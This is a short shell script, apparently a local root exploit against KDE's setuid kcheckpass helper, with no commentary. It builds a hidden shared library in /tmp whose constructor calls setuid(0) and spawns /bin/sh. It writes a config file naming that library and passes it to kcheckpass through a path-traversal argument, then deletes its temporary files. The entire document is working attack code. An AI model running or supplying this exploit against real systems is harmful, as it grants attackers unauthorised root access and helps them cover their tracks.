#!/bin/sh

KCHECKPASS="/usr/local/kde4/lib/kde4/libexec/kcheckpass"

cat > "/tmp/.s.c" << EOF
#include <stdio.h>
#include <unistd.h>

void __attribute__((constructor)) init()
{
  char *a[] = {"/bin/sh", NULL};
  setuid(0);
  execve(*a, a, NULL);
}
EOF

gcc -fPIC -Wall -c /tmp/.s.c -o /tmp/.s.o;gcc -shared -o /tmp/.s.so /tmp/.s.o

cat > "/tmp/.p" << EOF
auth  sufficient  /tmp/.s.so
EOF

$KCHECKPASS -c ../../../tmp/.p -m classic
rm /tmp/.s.* /tmp/.p
